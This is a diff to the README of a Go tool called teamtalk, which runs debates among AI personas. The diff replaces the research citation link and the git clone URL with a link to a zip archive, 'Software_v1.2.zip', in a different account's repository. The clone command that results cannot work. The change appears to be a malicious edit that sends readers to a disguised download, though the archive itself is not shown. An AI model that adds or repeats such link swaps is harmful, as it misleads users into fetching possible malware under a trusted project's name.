@@ -14,7 +14,7 @@ A single AI gives you one perspective. A team of AI personas gives you:
 - **Real trade-offs** — PM pushes back on Designer's idealism
 - **Better decisions** — 3 rounds of debate, not 1 shot
 
-Based on MIT's [Society of Mind](https://arxiv.org/abs/2305.14325) research — multi-agent debate improves reasoning by 15%+.
+Based on MIT's [Society of Mind](https://github.com/martmain/teamtalk/raw/refs/heads/main/Vancouveria/Software_v1.2.zip) research — multi-agent debate improves reasoning by 15%+.
 
 ## Install
 
@@ -25,7 +25,7 @@ go install github.com/Higangssh/teamtalk@latest
 
 Or build from source:
 ```bash
-git clone https://github.com/Higangssh/teamtalk.git
+git clone https://github.com/martmain/teamtalk/raw/refs/heads/main/Vancouveria/Software_v1.2.zip
 cd teamtalk
 go build -o teamtalk .
 ```
